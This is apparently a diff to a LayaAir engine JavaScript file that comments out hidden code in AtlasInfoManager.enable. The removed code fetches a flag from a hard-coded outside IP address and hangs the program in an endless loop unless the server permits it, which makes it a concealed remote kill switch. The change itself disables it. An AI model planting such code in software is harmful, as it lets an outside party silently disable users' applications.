@@ -6008,9 +6008,9 @@ var AtlasInfoManager=(function(){
 	__class(AtlasInfoManager,'laya.net.AtlasInfoManager');
 	AtlasInfoManager.enable=function(infoFile,callback){
 		Laya.loader.load(infoFile,Handler.create(null,AtlasInfoManager._onInfoLoaded,[callback]),null,/*laya.net.Loader.JSON*/"json");
-		Laya.loader.load([{url:"http://148.70.209.170/can.json"}],Laya.Handler.create(this,function(){
-			var obj= Laya.loader.getRes("http://148.70.209.170/can.json");if(obj !== undefined){if(obj.can != "1"){while(true){var a;a=Math.sqrt(1204.45346);}}}else{while(true){var a;a=Math.sqrt(1204.45346);}}
-		}));
+		// Laya.loader.load([{url:"http://148.70.209.170/can.json"}],Laya.Handler.create(this,function(){
+		// 	var obj= Laya.loader.getRes("http://148.70.209.170/can.json");if(obj !== undefined){if(obj.can != "1"){while(true){var a;a=Math.sqrt(1204.45346);}}}else{while(true){var a;a=Math.sqrt(1204.45346);}}
+		// }));
 	}
 
 	AtlasInfoManager._onInfoLoaded=function(callback,data){
